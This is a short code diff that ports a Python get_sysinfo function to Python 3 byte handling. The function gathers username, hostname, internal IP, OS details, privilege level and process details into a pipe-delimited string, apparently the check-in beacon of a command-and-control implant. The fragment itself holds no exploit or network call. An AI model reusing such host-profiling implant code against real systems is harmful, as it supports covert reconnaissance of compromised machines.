@@ -55,10 +55,9 @@ def get_sysinfo(nonce='00000000'):
     cmd = 'ps %s' % (os.getpid())
     ps = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     out, err = ps.communicate()
-    parts = out.split("\n")
+    parts = out.split(b"\n")
     if len(parts) > 2:
-        processName = " ".join(parts[1].split()[4:])
+        processName = b" ".join(parts[1].split()[4:])
     else:
         processName = 'python'
-
-    return "%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s" % (nonce, server, '', username, hostname, internalIP, osDetails, highIntegrity, processName, processID, language, pyVersion)
+    return "%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s" % (nonce, server, '', username, hostname, internalIP, osDetails, highIntegrity, processName.decode('UTF-8'), processID, language, pyVersion)
